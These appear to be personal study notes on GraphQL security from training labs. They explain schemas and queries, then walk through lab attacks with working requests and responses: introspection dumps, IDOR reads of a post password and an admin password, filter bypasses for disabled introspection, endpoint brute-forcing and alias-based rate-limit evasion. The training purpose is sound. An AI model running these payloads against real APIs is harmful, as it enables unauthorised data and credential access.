### How GraphQL works
GraphQL schemas define the structure of the service's data, listing the available objects (known as types), fields, and relationships.

The data described by a GraphQL schema can be manipulated using three types of operation:
- Queries fetch data.
- Mutations add, change, or remove data.
- Subscriptions are similar to queries, but set up a permanent connection by which a server can proactively push data to a client in the specified format.

###  What is a GraphQL schema?
In GraphQL, the schema represents a contract between the frontend and backend of the service. It defines the data available as a series of types, using a human-readable schema definition language. These types can then be implemented by a service.

Most of the types defined are object types, which define the objects available and the fields and arguments they have. Each field has its own type, which can either be another object or a scalar, enum, union, interface, or custom type.

The example below shows a simple schema definition for a Product type. The ! operator indicates that the field is non-nullable when called (that is, mandatory). 
```bash
    #Example schema definition

    type Product {
        id: ID!
        name: String!
        description: String!
        price: Int
    }
```

### What are GraphQL queries?
GraphQL queries retrieve data from the data store. They are roughly equivalent to GET requests in a REST API.

Queries usually have the following key components:
- A query operation type. This is technically optional but encouraged, as it explicitly tells the server that the incoming request is a query.
- A query name. This can be anything you want. The query name is optional, but encouraged as it can help with debugging.
- A data structure. This is the data that the query should return.
- Optionally, one or more arguments. These are used to create queries that return details of a specific object (for example "give me the name and description of the product that has the ID 123").

The example below shows a query called myGetProductQuery that requests the name, and description fields of a product with the id of 123.
```bash
    #Example query

    query myGetProductQuery {
        getProduct(id: 123) {
            name
            description
        }
    }
```

### What are GraphQL mutations?
Mutations change data in some way, either adding, deleting, or editing it. They are roughly equivalent to a REST API's POST, PUT, and DELETE methods.

Like queries, mutations have an operation type, name, and structure for the returned data. However, mutations always take an input of some type. This can be an inline value, but in practice is generally provided as a variable.

The example below shows a mutation to create a new product and its associated response. In this case, the service is configured to automatically assign an ID to new products, which has been returned as requested.
```bash
    #Example mutation request

    mutation {
        createProduct(name: "Flamin' Cocktail Glasses", listed: "yes") {
            id
            name
            listed
        }
    }
```
```bash
    #Example mutation response

    {
        "data": {
            "createProduct": {
                "id": 123,
                "name": "Flamin' Cocktail Glasses",
                "listed": "yes"
            }
        }
    }
```

### Components of queries and mutations
The GraphQL syntax includes several common components for queries and mutations.

### Fields
All GraphQL types contain items of queryable data called fields. When you send a query or mutation, you specify which of the fields you want the API to return. The response mirrors the content specified in the request.

The example below shows a query to get ID and name details for all employees, and its associated response. In this case, id, name.firstname, and name.lastname are the fields requested.
```bash
    #Request

    query myGetEmployeeQuery {
        getEmployees {
            id
            name {
                firstname
                lastname
            }
        }
    }
```
```bash
    #Response

    {
        "data": {
            "getEmployees": [
                {
                    "id": 1,
                    "name" {
                        "firstname": "Carlos",
                        "lastname": "Montoya"
                    }
                },
                {
                    "id": 2,
                    "name" {
                        "firstname": "Peter",
                        "lastname": "Wiener"
                    }
                }
            ]
        }
    }
```

### Arguments
Arguments are values that are provided for specific fields. The arguments that can be accepted for a type are defined in the schema.

When you send a query or mutation that contains arguments, the GraphQL server determines how to respond based on its configuration. For example, it might return a specific object rather than details of all objects.

The example below shows a getEmployee request that takes an employee ID as an argument. In this case, the server responds with only the details of the employee who matches that ID.
```bash
    #Example query with arguments

    query myGetEmployeeQuery {
        getEmployees(id:1) {
            name {
                firstname
                lastname
            }
        }
    }
```
```bash
    #Response to query

    {
        "data": {
            "getEmployees": [
            {
                "name" {
                    "firstname": Carlos,
                    "lastname": Montoya
                    }
                }
            ]
        }
    }
```

### Variables
Variables enable you to pass dynamic arguments, rather than having arguments directly within the query itself.

Variable-based queries use the same structure as queries using inline arguments, but certain aspects of the query are taken from a separate JSON-based variables dictionary. They enable you to reuse a common structure among multiple queries, with only the value of the variable itself changing.

When building a query or mutation that uses variables, you need to:
- Declare the variable and type.
- Add the variable name in the appropriate place in the query.
- Pass the variable key and value from the variable dictionary.

The example below shows the same query as in the previous example, but with the ID passed as a variable instead of as a direct part of the query string. 

```bash
    #Example query with variable

    query getEmployeeWithVariable($id: ID!) {
        getEmployees(id:$id) {
            name {
                firstname
                lastname
            }
         }
    }

    Variables:
    {
        "id": 1
    }
```
In this example, the variable is declared in the first line with ($id: ID!). The ! indicates that this is a required field for this query. It is then used as an argument in the second line with (id:$id). Finally, the value of the variable itself is set in the variable JSON dictionary.

### Aliases
GraphQL objects can't contain multiple properties with the same name. For example, the following query is invalid because it tries to return the product type twice.
```bash
    #Invalid query

    query getProductDetails {
        getProduct(id: 1) {
            id
            name
        }
        getProduct(id: 2) {
            id
            name
        }
    }
```

Aliases enable you to bypass this restriction by explicitly naming the properties you want the API to return. You can use aliases to return multiple instances of the same type of object in one request. This helps to reduce the number of API calls needed.

In the example below, the query uses aliases to specify a unique name for both products. This query now passes validation, and the details are returned.
```bash
    #Valid query using aliases

    query getProductDetails {
        product1: getProduct(id: "1") {
            id
            name
        }
        product2: getProduct(id: "2") {
            id
            name
        }
    }
```
```bash
    #Response to query

    {
        "data": {
            "product1": {
                "id": 1,
                "name": "Juice Extractor"
             },
            "product2": {
                "id": 2,
                "name": "Fruit Overlays"
            }
        }
    }
```

###  Fragments
Fragments are reusable parts of queries or mutations. They contain a subset of the fields belonging to the associated type.

Once defined, they can be included in queries or mutations. If they are subsequently changed, the change is included in every query or mutation that calls the fragment.

The example below shows a getProduct query in which the details of the product are contained in a productInfo fragment. 
```bash
    #Example fragment

    fragment productInfo on Product {
        id
        name
        listed
    }
```
```bash
    #Query calling the fragment

    query {
        getProduct(id: 1) {
            ...productInfo
            stock
        }
    }
```
```bash
    #Response including fragment fields

    {
        "data": {
            "getProduct": {
                "id": 1,
                "name": "Juice Extractor",
                "listed": "no",
                "stock": 5
            }
        }
    }
```

### Subscriptions
Subscriptions are a special type of query. They enable clients to establish a long-lived connection with a server so that the server can then push real-time updates to the client without the need to continually poll for data. They are primarily useful for small changes to large objects and for functionality that requires small real-time updates (like chat systems or collaborative editing).

As with regular queries and mutations, the subscription request defines the shape of the data to be returned.

Subscriptions are commonly implemented using WebSockets. 


### Introspection
Introspection is a built-in GraphQL function that enables you to query a server for information about the schema. It is commonly used by applications such as GraphQL IDEs and documentation generation tools.

Like regular queries, you can specify the fields and structure of the response you want to be returned. For example, you might want the response to only contain the names of available mutations.

Introspection can represent a serious information disclosure risk, as it can be used to access potentially sensitive information (such as field descriptions) and help an attacker to learn how they can interact with the API. It is best practice for introspection to be disabled in production environments.


### GraphQL in burp:
https://portswigger.net/burp/documentation/desktop/testing-workflow/working-with-graphql


### Finding GraphQL endpoints
Before you can test a GraphQL API, you first need to find its endpoint. As GraphQL APIs use the same endpoint for all requests, this is a valuable piece of information. 

### Universal queries
If you send `query{__typename}` to any GraphQL endpoint, it will include the string {"data": {"__typename": "query"}} somewhere in its response. This is known as a universal query, and is a useful tool in probing whether a URL corresponds to a GraphQL service.

The query works because every GraphQL endpoint has a reserved field called __typename that returns the queried object's type as a string.

### Common endpoint names
GraphQL services often use similar endpoint suffixes. When testing for GraphQL endpoints, you should look to send universal queries to the following locations:
- /graphql
- /api
- /api/graphql
- /graphql/api
- /graphql/graphql

If these common endpoints don't return a GraphQL response, you could also try appending /v1 to the path.

> Note:
> GraphQL services will often respond to any non-GraphQL request with a "query not present" or similar error. You should bear this in mind when testing for GraphQL endpoints.

### Request methods
The next step in trying to find GraphQL endpoints is to test using different request methods.

It is best practice for production GraphQL endpoints to only accept POST requests that have a content-type of application/json, as this helps to protect against CSRF vulnerabilities. However, some endpoints may accept alternative methods, such as GET requests or POST requests that use a content-type of x-www-form-urlencoded.

If you can't find the GraphQL endpoint by sending POST requests to common endpoints, try resending the universal query using alternative HTTP methods. 

### Exploiting unsanitized arguments
At this point, you can start to look for vulnerabilities. Testing query arguments is a good place to start.

If the API uses arguments to access objects directly, it may be vulnerable to access control vulnerabilities. A user could potentially access information they should not have simply by supplying an argument that corresponds to that information. This is sometimes known as an insecure direct object reference (IDOR). 

For example, the query below requests a product list for an online shop: 
```bash
    #Example product query

    query {
        products {
            id
            name
            listed
        }
    }
```
The product list returned contains only listed products. 
```bash
    #Example product response

    {
        "data": {
            "products": [
                {
                    "id": 1,
                    "name": "Product 1",
                    "listed": true
                },
                {
                    "id": 2,
                    "name": "Product 2",
                    "listed": true
                },
                {
                    "id": 4,
                    "name": "Product 4",
                    "listed": true
                }
            ]
        }
    }
```
From this information, we can infer the following:
- Products are assigned a sequential ID.
- Product ID 3 is missing from the list, possibly because it has been delisted.

By querying the ID of the missing product, we can get its details, even though it is not listed on the shop and was not returned by the original product query.
```bash
    #Query to get missing product

    query {
        product(id: 3) {
            id
            name
            listed
        }
    }
```
```bash
    #Missing product response

    {
        "data": {
            "product": {
            "id": 3,
            "name": "Product 3",
            "listed": no
            }
        }
    }
```

###  Discovering schema information
The next step in testing the API is to piece together information about the underlying schema.

The best way to do this is to use introspection queries. Introspection is a built-in GraphQL function that enables you to query a server for information about the schema.

Introspection helps you to understand how you can interact with a GraphQL API. It can also disclose potentially sensitive data, such as description fields.

### Using introspection 
To use introspection to discover schema information, query the __schema field. This field is available on the root type of all queries.

Like regular queries, you can specify the fields and structure of the response you want to be returned when running an introspection query. For example, you might want the response to contain only the names of available mutations.

> Note
> Burp can generate introspection queries for you. For more information, see Accessing GraphQL API schemas using introspection.

### Probing for introspection 
It is best practice for introspection to be disabled in production environments, but this advice is not always followed.

You can probe for introspection using the following simple query. If introspection is enabled, the response returns the names of all available queries.
```bash
    #Introspection probe request

    {
        "query": "{__schema{queryType{name}}}"
    }
```

### Running a full introspection query 
The next step is to run a full introspection query against the endpoint so that you can get as much information on the underlying schema as possible.

The example query below returns full details on all queries, mutations, subscriptions, types, and fragments. 

```bash
    #Full introspection query

    query IntrospectionQuery {
        __schema {
            queryType {
                name
            }
            mutationType {
                name
            }
            subscriptionType {
                name
            }
            types {
             ...FullType
            }
            directives {
                name
                description
                args {
                    ...InputValue
            }
            onOperation  #Often needs to be deleted to run query
            onFragment   #Often needs to be deleted to run query
            onField      #Often needs to be deleted to run query
            }
        }
    }

    fragment FullType on __Type {
        kind
        name
        description
        fields(includeDeprecated: true) {
            name
            description
            args {
                ...InputValue
            }
            type {
                ...TypeRef
            }
            isDeprecated
            deprecationReason
        }
        inputFields {
            ...InputValue
        }
        interfaces {
            ...TypeRef
        }
        enumValues(includeDeprecated: true) {
            name
            description
            isDeprecated
            deprecationReason
        }
        possibleTypes {
            ...TypeRef
        }
    }

    fragment InputValue on __InputValue {
        name
        description
        type {
            ...TypeRef
        }
        defaultValue
    }

    fragment TypeRef on __Type {
        kind
        name
        ofType {
            kind
            name
            ofType {
                kind
                name
                ofType {
                    kind
                    name
                }
            }
        }
    }
```

> Note
> If introspection is enabled but the above query doesn't run, try removing the onOperation, onFragment, and onField directives from the query structure. Many endpoints do not accept these directives as part of an introspection query, and you can often have more success with introspection by removing them.

### Visualizing introspection results
Responses to introspection queries can be full of information, but are often very long and hard to process.

You can view relationships between schema entities more easily using a [GraphQL visualizer](http://nathanrandal.com/graphql-visualizer/) tool that takes the results of an introspection query and produces a visual representation of the returned data, including the relationships between operations and types. 

### Suggestions
Even if introspection is entirely disabled, you can sometimes use suggestions to glean information on an API's structure.

Suggestions are a feature of the Apollo GraphQL platform in which the server can suggest query amendments in error messages. These are generally used where a query is slightly incorrect but still recognizable (for example, There is no entry for 'productInfo'. Did you mean 'productInformation' instead?).

You can potentially glean useful information from this, as the response is effectively giving away valid parts of the schema.

Clairvoyance is a tool that uses suggestions to automatically recover all or part of a GraphQL schema, even when introspection is disabled. This makes it significantly less time consuming to piece together information from suggestion responses.

You cannot disable suggestions directly in Apollo. See this GitHub thread for a workaround.
Note

Burp Scanner can automatically test for suggestions as part of its scans. If active suggestions are found, Burp Scanner reports a "GraphQL suggestions enabled" issue.

### APPRENTICE Lab: Accessing private GraphQL posts
To figure out if the endpoint corresponds to a graphsql endpoint first try to send universal query

normal req.body:
```bash
{"query":"\nquery getBlogSummaries {\n    getAllBlogPosts {\n        image\n        title\n        summary\n        id\n    }\n}","operationName":"getBlogSummaries"}
```
but we first send universal query in the req.body:
```bash
{"query":"{__typename}"}
```
Response:
```bash
{
  "data": {
    "__typename": "query"
  }
}
```

Next we try to send introspection probing req:
```bash
    {
        "query": "{__schema{queryType{name}}}"
    }
```
Response returns the name of all the available queries (at least that's what it says in the video):
```bash
{
  "data": {
    "__schema": {
      "queryType": {
        "name": "query"
      }
    }
  }
}
```

So we run the full introspection query in the burp's GraphQL tab:
```bash
    query IntrospectionQuery {
        __schema {
            queryType {
                name
            }
            mutationType {
                name
            }
            subscriptionType {
                name
            }
            types {
             ...FullType
            }
            directives {
                name
                description
                args {
                    ...InputValue
            }
            onOperation  #Often needs to be deleted to run query
            onFragment   #Often needs to be deleted to run query
            onField      #Often needs to be deleted to run query
            }
        }
    }

    fragment FullType on __Type {
        kind
        name
        description
        fields(includeDeprecated: true) {
            name
            description
            args {
                ...InputValue
            }
            type {
                ...TypeRef
            }
            isDeprecated
            deprecationReason
        }
        inputFields {
            ...InputValue
        }
        interfaces {
            ...TypeRef
        }
        enumValues(includeDeprecated: true) {
            name
            description
            isDeprecated
            deprecationReason
        }
        possibleTypes {
            ...TypeRef
        }
    }

    fragment InputValue on __InputValue {
        name
        description
        type {
            ...TypeRef
        }
        defaultValue
    }

    fragment TypeRef on __Type {
        kind
        name
        ofType {
            kind
            name
            ofType {
                kind
                name
                ofType {
                    kind
                    name
                }
            }
        }
    }
```

In the resp we get errors:
```bash
{
  "errors": [
    {
      "extensions": {},
      "locations": [
        {
          "line": 21,
          "column": 13
        }
      ],
      "message": "Validation error (FieldUndefined@[__schema/directives/onOperation]) : Field 'onOperation' in type '__Directive' is undefined"
    },
    {
      "extensions": {},
      "locations": [
        {
          "line": 22,
          "column": 13
        }
      ],
      "message": "Validation error (FieldUndefined@[__schema/directives/onFragment]) : Field 'onFragment' in type '__Directive' is undefined"
    },
    {
      "extensions": {},
      "locations": [
        {
          "line": 23,
          "column": 13
        }
      ],
      "message": "Validation error (FieldUndefined@[__schema/directives/onField]) : Field 'onField' in type '__Directive' is undefined"
    }
  ]
}
```

So the documentation says that there are some parts of introspection query that needs to be deleted. Let's delete it and run again:
```bash
    query IntrospectionQuery {
        __schema {
            queryType {
                name
            }
            mutationType {
                name
            }
            subscriptionType {
                name
            }
            types {
             ...FullType
            }
            directives {
                name
                description
                args {
                    ...InputValue
            }
            }
        }
    }

    fragment FullType on __Type {
        kind
        name
        description
        fields(includeDeprecated: true) {
            name
            description
            args {
                ...InputValue
            }
            type {
                ...TypeRef
            }
            isDeprecated
            deprecationReason
        }
        inputFields {
            ...InputValue
        }
        interfaces {
            ...TypeRef
        }
        enumValues(includeDeprecated: true) {
            name
            description
            isDeprecated
            deprecationReason
        }
        possibleTypes {
            ...TypeRef
        }
    }

    fragment InputValue on __InputValue {
        name
        description
        type {
            ...TypeRef
        }
        defaultValue
    }

    fragment TypeRef on __Type {
        kind
        name
        ofType {
            kind
            name
            ofType {
                kind
                name
                ofType {
                    kind
                    name
                }
            }
        }
    }
```

Now we get far better result in the resp, but it's really long so only paste the beginning:
```bash
{
  "data": {
    "__schema": {
      "queryType": {
        "name": "query"
      },
      "mutationType": null,
      "subscriptionType": null,
      "types": [
        {
          "kind": "OBJECT",
          "name": "BlogPost",
          "description": null,
          "fields": [
            {
              "name": "id",
              "description": null,
              "args": [],
              "type": {
                "kind": "NON_NULL",
                "name": null,
                "ofType": {
                  "kind": "SCALAR",
                  "name": "Int",
                  "ofType": null
                }
              },
              "isDeprecated": false,
              "deprecationReason": null
            },
            {
              "name": "image",
              "description": null,
              "args": [],
              "type": {
                "kind": "NON_NULL",
                "name": null,
                "ofType": {
                  "kind": "SCALAR",
                  "name": "String",
                  "ofType": null
                }
              },
              "isDeprecated": false,
              "deprecationReason": null
            },
            {
              "name": "title",
              "description": null,
              "args": [],
              "type": {
                "kind": "NON_NULL",
                "name": null,
                "ofType": {
                  "kind": "SCALAR",
                  "name": "String",
                  "ofType": null
                }
              },
              "isDeprecated": false,
              "deprecationReason": null
            },
            {
              "name": "author",
              "description": null,
              "args": [],
              "type": {
                "kind": "NON_NULL",
                "name": null,
                "ofType": {
                  "kind": "SCALAR",
                  "name": "String",
                  "ofType": null
                }
              },
              "isDeprecated": false,
              "deprecationReason": null
            },
            {
              "name": "date",
              "description": null,
              "args": [],
              "type": {
                "kind": "NON_NULL",
                "name": null,
                "ofType": {
                  "kind": "SCALAR",
                  "name": "Timestamp",
                  "ofType": null
                }
              },
              "isDeprecated": false,
              "deprecationReason": null
            },
            {
              "name": "summary",
              "description": null,
              "args": [],
              "type": {
                "kind": "NON_NULL",
                "name": null,
                "ofType": {
                  "kind": "SCALAR",
                  "name": "String",
                  "ofType": null
                }
              },
              "isDeprecated": false,
              "deprecationReason": null
            },
            {
              "name": "paragraphs",
              "description": null,
              "args": [],
              "type": {
                "kind": "NON_NULL",
                "name": null,
                "ofType": {
                  "kind": "LIST",
                  "name": null,
                  "ofType": {
                    "kind": "NON_NULL",
                    "name": null,
                    "ofType": {
                      "kind": "SCALAR",
                      "name": "String"
                    }
                  }
                }
              },
              "isDeprecated": false,
              "deprecationReason": null
            },
            {
              "name": "isPrivate",
              "description": null,
              "args": [],
              "type": {
                "kind": "NON_NULL",
                "name": null,
                "ofType": {
                  "kind": "SCALAR",
                  "name": "Boolean",
                  "ofType": null
                }
              },
              "isDeprecated": false,
              "deprecationReason": null
            },
            {
              "name": "postPassword",
              "description": null,
              "args": [],
              "type": {
                "kind": "SCALAR",
                "name": "String",
                "ofType": null
              },
              "isDeprecated": false,
              "deprecationReason": null
            }
          ],
          "inputFields": null,
          "interfaces": [],
          "enumValues": null,
          "possibleTypes": null
        },
        {
          "kind": "SCALAR",
          "name": "Boolean",
          "description": "Built-in Boolean",
          "fields": null,
          "inputFields": null,
          "interfaces": null,
          "enumValues": null,
          "possibleTypes": null
        },
        {
          "kind": "SCALAR",
          "name": "Int",
          "description": "Built-in Int",
          "fields": null,
          "inputFields": null,
          "interfaces": null,
          "enumValues": null,
          "possibleTypes": null
        },
        {
          "kind": "SCALAR",
          "name": "String",
          "description": "Built-in String",
          "fields": null,
          "inputFields": null,
          "interfaces": null,
          "enumValues": null,
          "possibleTypes": null
        },
        {
          "kind": "SCALAR",
          "name": "Timestamp",
          "description": "Timestamp scalar",
          "fields": null,
          "inputFields": null,
          "interfaces": null,
          "enumValues": null,
          "possibleTypes": null
        },
        {
          "kind": "OBJECT",
          "name": "__Directive",
          "description": null,
          "fields": [
            {
              "name": "name",
              "description": "The __Directive type represents a Directive that a server supports.",
              "args": [],
              "type": {
                "kind": "NON_NULL",
                "name": null,
                "ofType": {
                  "kind": "SCALAR",
                  "name": "String",
                  "ofType": null
                }
              },
              "isDeprecated": false,
              "deprecationReason": null
            },
            {
              "name": "description",
              "description": null,
              "args": [],
              "type": {
                "kind": "SCALAR",
                "name": "String",
                "ofType": null
              },
              "isDeprecated": false,
              "deprecationReason": null
            },
            {
              "name": "isRepeatable",
              "description": null,
              "args": [],
              "type": {
                "kind": "NON_NULL",
                "name": null,
                "ofType": {
                  "kind": "SCALAR",
                  "name": "Boolean",
                  "ofType": null
                }
              },
              "isDeprecated": false,
              "deprecationReason": null
            },
            {
              "name": "locations",
              "description": null,
              "args": [],
              "type": {
                "kind": "NON_NULL",
                "name": null,
                "ofType": {
                  "kind": "LIST",
                  "name": null,
                  "ofType": {
                    "kind": "NON_NULL",
                    "name": null,
                    "ofType": {
                      "kind": "ENUM",
                      "name": "__DirectiveLocation"
                    }
                  }
                }
              },
              "isDeprecated": false,
              "deprecationReason": null
            },
            {
              "name": "args",
              "description": null,
              "args": [
                {
                  "name": "includeDeprecated",
                  "description": null,
                  "type": {
                    "kind": "SCALAR",
                    "name": "Boolean",
                    "ofType": null
                  },
                  "defaultValue": "false"
                }
              ],
              "type": {
                "kind": "NON_NULL",
                "name": null,
                "ofType": {
                  "kind": "LIST",
                  "name": null,
                  "ofType": {
                    "kind": "NON_NULL",
                    "name": null,
                    "ofType": {
                      "kind": "OBJECT",
                      "name": "__InputValue"
                    }
                  }
                }
              },
              "isDeprecated": false,
              "deprecationReason": null
            }
          ],
          "inputFields": null,
          "interfaces": [],
          "enumValues": null,
          "possibleTypes": null
        },
        {
          "kind": "ENUM",
          "name": "__DirectiveLocation",
          "description": "An enum describing valid locations where a directive can be placed",
          "fields": null,
          "inputFields": null,
          "interfaces": null,
          "enumValues": [
            {
              "name": "QUERY",
              "description": "Indicates the directive is valid on queries.",
              "isDeprecated": false,
              "deprecationReason": null
            },
            {
              "name": "MUTATION",
              "description": "Indicates the directive is valid on mutations.",
              "isDeprecated": false,
              "deprecationReason": null
            },
            {
              "name": "SUBSCRIPTION",
              "description": "Indicates the directive is valid on subscriptions.",
              "isDeprecated": false,
              "deprecationReason": null
            },
            {
              "name": "FIELD",
              "description": "Indicates the directive is valid on fields.",
              "isDeprecated": false,
              "deprecationReason": null
            },
            {
              "name": "FRAGMENT_DEFINITION",
              "description": "Indicates the directive is valid on fragment definitions.",
              "isDeprecated": false,
              "deprecationReason": null
            },
            {
              "name": "FRAGMENT_SPREAD",
              "description": "Indicates the directive is valid on fragment spreads.",
              "isDeprecated": false,
              "deprecationReason": null
            },
            {
              "name": "INLINE_FRAGMENT",
              "description": "Indicates the directive is valid on inline fragments.",
              "isDeprecated": false,
              "deprecationReason": null
            },
            {
              "name": "VARIABLE_DEFINITION",
              "description": "Indicates the directive is valid on variable definitions.",
              "isDeprecated": false,
              "deprecationReason": null
            },
            {
              "name": "SCHEMA",
              "description": "Indicates the directive is valid on a schema SDL definition.",
              "isDeprecated": false,
              "deprecationReason": null
            },
            {
              "name": "SCALAR",
              "description": "Indicates the directive is valid on a scalar SDL definition.",
              "isDeprecated": false,
              "deprecationReason": null
            },
            {
              "name": "OBJECT",
              "description": "Indicates the directive is valid on an object SDL definition.",
              "isDeprecated": false,
              "deprecationReason": null
            },
            {
              "name": "FIELD_DEFINITION",
              "description": "Indicates the directive is valid on a field SDL definition.",
              "isDeprecated": false,
              "deprecationReason": null
            },
            {
              "name": "ARGUMENT_DEFINITION",
              "description": "Indicates the directive is valid on a field argument SDL definition.",
              "isDeprecated": false,
              "deprecationReason": null
            },
            {
              "name": "INTERFACE",
              "description": "Indicates the directive is valid on an interface SDL definition.",
              "isDeprecated": false,
              "deprecationReason": null
            },
            {
              "name": "UNION",
              "description": "Indicates the directive is valid on an union SDL definition.",
              "isDeprecated": false,
              "deprecationReason": null
            },
            {
              "name": "ENUM",
              "description": "Indicates the directive is valid on an enum SDL definition.",
              "isDeprecated": false,
              "deprecationReason": null
            },
            {
              "name": "ENUM_VALUE",
              "description": "Indicates the directive is valid on an enum value SDL definition.",
              "isDeprecated": false,
              "deprecationReason": null
            },
            {
              "name": "INPUT_OBJECT",
              "description": "Indicates the directive is valid on an input object SDL definition.",
              "isDeprecated": false,
              "deprecationReason": null
            },
            {
              "name": "INPUT_FIELD_DEFINITION",
              "description": "Indicates the directive is valid on an input object field SDL definition.",
              "isDeprecated": false,
              "deprecationReason": null
            }
          ],
          "possibleTypes": null
        },
...
```
So let's use [GraphQL visualizer](http://nathanrandal.com/graphql-visualizer/) for the results of introspection:
```bash
http://nathanrandal.com/graphql-visualizer
```
So we copy the response and paste it into the `Introspection Result`
And in the visualised result we see the Schema of the BlogPost
And we see that it contains `postPassword`
So we make a req with that `postPassword`:
```bash

    query getBlogPost($id: Int!) {
        getBlogPost(id: $id) {
            image
            title
            author
            date
            paragraphs
            summary
        	id
            postPassword
        }
    }

    {"id":3}
```

And in the result we see:
```bash
{
  "data": {
    "getBlogPost": {
      "image": "/image/blog/posts/3.jpg",
      "title": "Apps For Everything",
      "author": "Roger That",
      "date": "2024-11-22T11:04:28.187Z",
      "paragraphs": [
        "I have a really rubbish cell, it doesn't have enough memory for anything more than the default Apps. Of course, it's not quite a Nokia 1011, but it may as well be. As someone that always had a PC, and was on the internet in 1997, now it's me that is feeling left behind.",
        "You see, what happens is when anything becomes popular and mainstream they take everything else away. Speaking to humans in customer service for a start. If I'm having internet issues and can't get online that recorded message telling me to 'go to www dot'' is just plain infuriating. Yes, I will respond, out loud, that if I could do that I wouldn't be phoning in the first place.",
        "I read about a young man who left his home fewer than ten times in seven years, he spent his life in isolation playing video games. I'm happy to report he sought help and has created a delightful, old-fashioned board game to help others. All you need is a pen and piece of paper. I was thinking this is what we need in the world, back to basics, then someone turns around and says they are planning on making it into an App! Irony much?",
        "Cells do just about everything now. As things become automated and machines save time and money, queuing to check in at an airport is a thing of the past, or is it? It should all run smoothly, and it would if they didn't put the instructions in one language only, and it happens to be the language you don't speak. 'Madam your boarding card is on your cell.' 'ER, no it isn't.' I need paper, I need a thin card, I need human contact if I'm ever going to get through check-in stress-free.",
        "'Do you accept cards?' I ask, 'Oh Madam, we only take Apple payments.' 'Cash?' 'No Madam, just Apple payments.' And yet when I returned with a kilo of apples I still couldn't purchase my, 'Double Ristretto Venti Half-Soy Nonfat Decaf Organic Chocolate Brownie Iced Vanilla Double-Shot Gingerbread Frappuccino Extra Hot With Foam Whipped Cream Upside Down Double Blended, One Sweet'N Low and One Nutrasweet, and Ice!'",
        "The most useful function on my cell, other being able to make calls, is the alarm clock. But I do want to have more Apps. I want to be able to reply in the positive when I'm asked, 'Are you on?', 'Do you have?' Facebook, YouTube, Messenger, Google search, Google maps, Instagram, Snapchat, Google Play, Gmail and Pandora Radio - to name but a few. And why do I want to have a hundred Apps I'll never use? FOMO."
      ],
      "summary": "I have a really rubbish cell, it doesn't have enough memory for anything more than the default Apps. Of course, it's not quite a Nokia 1011, but it may as well be. As someone that always had a PC, and...",
      "id": 3,
      "postPassword": "rz861wsy0wogwryrxkv5ob49ddpltc06"
    }
  }
}
```

### PRACTITIONER Lab: Accidental exposure of private GraphQL fields
In the lab we see login mutation, let's send to repeater:
```bash
    mutation login($input: LoginInput!) {
        login(input: $input) {
            token
            success
        }
    }
    {"input":{"username":"wiener","password":"peter"}}
```
In the repeater, right click > GraphQL > Set introspection query > Send:
In the response we see a lot of lines, we copy them and go to the Graphql visualiser:
```bash
http://nathanrandal.com/graphql-visualizer
```

Also in the response where we get the results of introspection, let's right click > GraphQL > Save GraphQL queries to Site map
Then go to site map and find the GetUser query > Send to repeater
And we send the following req with the id: 1
```bash
query($id: Int!) {
  getUser(id: $id) {
    id
    username
    password
  }
}
{"id":1}
```

We get resp:
```bash
{
  "data": {
    "getUser": {
      "id": 1,
      "username": "administrator",
      "password": "mslf1lw63svgw6hqni8o"
    }
  }
}
```

### Bypassing GraphQL introspection defenses 
If you cannot get introspection queries to run for the API you are testing, try inserting a special character after the __schema keyword.

When developers disable introspection, they could use a regex to exclude the __schema keyword in queries. You should try characters like spaces, new lines and commas, as they are ignored by GraphQL but not by flawed regex.

As such, if the developer has only excluded __schema{, then the below introspection query would not be excluded. 
```bash
    #Introspection query with newline

    {
        "query": "query{__schema
        {queryType{name}}}"
    }

```

If this doesn't work, try running the probe over an alternative request method, as introspection may only be disabled over POST. Try a GET request, or a POST request with a content-type of x-www-form-urlencoded.

The example below shows an introspection probe sent via GET, with URL-encoded parameters.
```bash
    # Introspection probe as GET request

    GET /graphql?query=query%7B__schema%0A%7BqueryType%7Bname%7D%7D%7D
```

### PRACTITIONER Lab: Finding a hidden GraphQL endpoint
When we go through endpoints we don't see an endpoint for GraphQL, so we use Intruder to try to find it:
```bash
GET §/api§ HTTP/2
Host: 0a4900c10357e1b282cf7041007200b0.web-security-academy.net
Cookie: session=Tzzegi2mh3wQWVe8wR0aJylZuOqYfIET
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:133.0) Gecko/20100101 Firefox/133.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
```

In the payload we paste the following:
```bash
/graphql
/api
/api/graphql
/graphql/api
/graphql/graphql
/v1
```

We unclick url encode characters checkbox and start the intruder attack:
We see a lot of 404 responses but one of them is 400 which is the response of `/api`:
```bash
"Query not present"
```

So we send it to repeater and change the req method to POST and see that it's not allowed.
So we try:
```bash
GET /api?query=query{__typename} HTTP/2
```

And in the response we get:
```bash
{
  "data": {
    "__typename": "query"
  }
}
```

TODO: stopped

### Bypassing rate limiting using aliases 
While aliases are intended to limit the number of API calls you need to make, they can also be used to brute force a GraphQL endpoint.

Many endpoints will have some sort of rate limiter in place to prevent brute force attacks. Some rate limiters work based on the number of HTTP requests received rather than the number of operations performed on the endpoint. Because aliases effectively enable you to send multiple queries in a single HTTP message, they can bypass this restriction.

The simplified example below shows a series of aliased queries checking whether store discount codes are valid. This operation could potentially bypass rate limiting as it is a single HTTP request, even though it could potentially be used to check a vast number of discount codes at once.

```bash
    #Request with aliased queries

    query isValidDiscount($code: Int) {
        isvalidDiscount(code:$code){
            valid
        }
        isValidDiscount2:isValidDiscount(code:$code){
            valid
        }
        isValidDiscount3:isValidDiscount(code:$code){
            valid
        }
    }
```

### PRACTITIONER Lab: Bypassing GraphQL brute force protections



